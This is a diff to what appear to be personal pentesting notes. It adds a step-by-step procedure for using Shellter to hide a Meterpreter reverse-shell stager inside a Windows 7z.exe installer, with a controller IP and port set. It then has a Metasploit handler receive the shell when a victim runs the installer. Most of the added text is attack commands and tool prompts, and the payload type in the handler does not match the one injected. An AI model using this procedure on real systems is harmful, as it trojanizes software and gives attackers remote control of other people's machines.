@@ -240,4 +240,39 @@ sqli bind # only got true or false result, so use 'and ' or 'or'. so transfer th
 	shellter
 		requirements: wine, wine32
 			sudo dpkg --add-architecture i386 && apt update
+		> for win, target PE is a .exe installer. #Full path: PE Target: /home/kali/desktop/7z.exe  
+		> Auto Operation Mode
+		> Enable Stealth Mode? (Y/N/H): y
+		>************                                                                        
+		* Payloads *                                                                        
+		************                                                                        
+												    
+		[1] Meterpreter_Reverse_TCP   [stager]
+		[2] Meterpreter_Reverse_HTTP  [stager]
+		[3] Meterpreter_Reverse_HTTPS [stager]
+		[4] Meterpreter_Bind_TCP      [stager]
+		[5] Shell_Reverse_TCP         [stager]
+		[6] Shell_Bind_TCP            [stager]
+		[7] WinExec
+		
+		Use a listed payload or custom? (L/C/H): l
+		> Use a listed payload or custom? (L/C/H): l
+                                                                                    
+		Select payload by index: 2                                                          
+												    
+		****************************                                                        
+		* meterpreter_reverse_http *                                                        
+		****************************                                                        
+												    
+		SET LHOST: 192.168.1.118         # controller IP                                                     
+												    
+		SET LPORT: 4444   
+		> on the ontroller host,   $msfdb run
+		> msf> use exploit/multi/handler
+		> set PAYLOAD windows/meterpreter/reverse_tcp
+		> set LHOST IP # controller IP
+		> show options
+		> run
+		>> open the modified installer on target win host, a reverse shell will be sent. But it will be closed when the insta;;er is shudown.
+
 			
